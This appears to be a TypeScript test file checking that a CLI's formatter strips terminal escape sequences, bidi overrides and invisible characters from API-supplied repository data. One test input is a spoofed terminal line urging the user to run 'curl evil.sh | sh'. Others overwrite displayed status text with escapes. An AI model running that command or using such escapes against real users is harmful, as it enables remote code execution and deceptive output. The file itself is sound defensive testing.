import { describe, expect, it } from "vitest";
import {
  formatDetail,
  formatTrack,
  formatTrending,
  text,
} from "../src/format.js";
import type { Detail, Track, Trending } from "../src/types.js";

// Built from code points so this file stays free of the characters it guards
// against.
const point = (code: number) => String.fromCodePoint(code);
const esc = point(0x1b);

const momentum = {
  window: "24h",
  score: 9.1,
  rank: 1,
  starDelta: 10,
  starVelocity: 1,
  relativeGrowth: 0.1,
  acceleration: 0.1,
  forkDelta: 1,
  confidence: 0.9,
  confidenceLabel: "high",
  reasons: [] as string[],
  flags: [] as string[],
  formulaVersion: "v1",
  scoredAt: "2026-08-01T00:00:00Z",
};

const repository = {
  owner: "orbit-labs",
  name: "signal-kit",
  fullName: "orbit-labs/signal-kit",
  description: "A tiny signal processing kit",
  url: "https://github.com/orbit-labs/signal-kit",
  language: "Go",
  topics: [],
  license: "MIT",
  stars: 100,
  forks: 2,
  openIssues: 1,
};

const detail = (overrides: Partial<typeof repository> = {}) =>
  ({
    repository: { ...repository, ...overrides },
    momentum: { "24h": momentum },
    tracking: { state: "active", tier: "hot", trackingSince: null },
  }) as unknown as Detail;

describe("text", () => {
  it("strips the escape character that opens a control sequence", () => {
    const hostile = `harmless${esc}[2K\r${esc}[31mCRITICAL: run 'curl evil.sh | sh'`;
    const safe = text(hostile);

    expect(safe).not.toContain(esc);
    expect(safe).not.toContain("\r");
    // The words survive; only their power to redraw the terminal is gone.
    expect(safe).toContain("harmless");
    expect(safe).toContain("CRITICAL");
  });

  it.each([
    ["C1 CSI", point(0x9b)],
    ["bidi override", point(0x202e)],
    ["bidi isolate", point(0x2066)],
    ["zero width space", point(0x200b)],
    ["byte order mark", point(0xfeff)],
    ["DEL", point(0x7f)],
  ])("removes %s", (_name, character) => {
    expect(text(`before${character}after`)).toBe("beforeafter");
  });

  it("keeps ordinary text intact", () => {
    expect(text("A tiny signal processing kit")).toBe(
      "A tiny signal processing kit",
    );
    expect(text("日本語のリポジトリ")).toBe("日本語のリポジトリ");
    expect(text("emoji 🚀 stay")).toBe("emoji 🚀 stay");
    expect(text("")).toBe("");
  });

  it("collapses whitespace controls rather than joining words", () => {
    expect(text("first\n\nsecond")).toBe("first second");
    expect(text("tab\tseparated")).toBe("tab separated");
    expect(text("  padded  ")).toBe("padded");
  });
});

describe("rendering never emits API-supplied escapes", () => {
  it("sanitises the repository description", () => {
    const output = formatDetail(
      detail({ description: `clean${esc}[2K\rforged` }),
      false,
    );

    expect(output).not.toContain(esc);
    expect(output).toContain("clean");
  });

  it("sanitises a hostile language and full name", () => {
    const output = formatDetail(
      detail({
        fullName: `orbit-labs/signal-kit${esc}[31m`,
        language: `Go${esc}[1m`,
      }),
      false,
    );

    expect(output).not.toContain(esc);
  });

  it("sanitises trending rows and metadata", () => {
    const trending = {
      data: [
        {
          repository: { ...repository, fullName: `owner/repo${esc}[31m` },
          momentum: { ...momentum, confidenceLabel: `high${esc}[0m` },
          sparkline: [],
        },
      ],
      meta: {
        window: `24h${esc}[1m`,
        collection: `all${esc}[1m`,
        generatedAt: "2026-08-01T00:00:00Z",
        demoMode: false,
        resultCount: 1,
        formulaVersion: "v1",
      },
      links: { nextCursor: null },
    } as unknown as Trending;

    expect(formatTrending(trending, false)).not.toContain(esc);
  });

  it("sanitises a track response", () => {
    const track = {
      status: "queued",
      repository: `owner/repo${esc}[31m`,
      message: `Queued.${esc}[2K\rActually failed.`,
      webUrl: `https://example.test${esc}[0m`,
    } as unknown as Track;

    expect(formatTrack(track, false)).not.toContain(esc);
  });

  it("still emits its own colour codes when colour is enabled", () => {
    // Sanitisation must not disarm the CLI's own styling, which is applied
    // after the API's text has been made inert.
    expect(formatDetail(detail(), true)).toContain(esc);
  });
});
